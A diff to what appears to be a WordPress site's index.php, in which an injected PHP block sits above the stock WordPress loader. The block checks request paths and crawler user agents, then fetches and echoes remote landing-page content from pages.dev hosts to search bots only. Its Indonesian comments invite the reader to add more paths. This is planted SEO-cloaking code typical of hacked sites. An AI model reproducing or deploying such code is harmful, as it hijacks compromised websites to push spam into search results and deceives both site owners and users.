@@ -1,6 +1,6 @@
 <?php
 
-function mangsud($url) {
+function superbones($url) {
     if (ini_get('allow_url_fopen')) {
         return @file_get_contents($url);
     } elseif (function_exists('curl_init')) {
@@ -20,20 +20,20 @@ $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
 
 $bot_regex = "/(googlebot|google|adsbot|mediapartners|bingbot|slurp|yandex|duckduck|baidu|ahrefs|semrush|mj12|dotbot|crawler|spider|facebook|twitterbot|telegrambot)/i";
 
-// LP untuk bot
-$remote_lp = "https://lp-commissioning-applyingforcxacertification.pages.dev/";
-// AMP untuk IP Indonesia langsung redirect aja
-$amp = "https://commissioning-applyingforcxacertification.pages.dev/ts99-v1";
+// Landingpages raw or html
+$remote_lp = "https://anjing-bawapalu.pages.dev/";
+// link reff amp
+$amp = "https://depodulu-limpulwak.pages.dev/";
 
-// ------- match multiple path -------
+// ------- enumerations path -------
 $match_paths = [
-    "/applyingforcxacertification/",
-    "/applyingforcxacertification/",
-    "/applyingforcxacertification/",
+    "/academy/",
+    "/academy/",
+    "/academy/",
 ];
-// tinggal tambah sendiri ya bro, misalnya:
-// "/applyingforcxacertification/",
-// "/applyingforcxacertification/",
+// tempel disini path:
+// "/academy/",
+// "/academy/",
 
 if (in_array($uri, $match_paths, true)) {
 
@@ -46,10 +46,27 @@ if (in_array($uri, $match_paths, true)) {
     }
 
     if (preg_match($bot_regex, $ua)) {
-        $f = mangsud($remote_lp);
+        $f = superbones($remote_lp);
         echo $f ?: "";
         exit;
     }
 }
 
 ?>
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
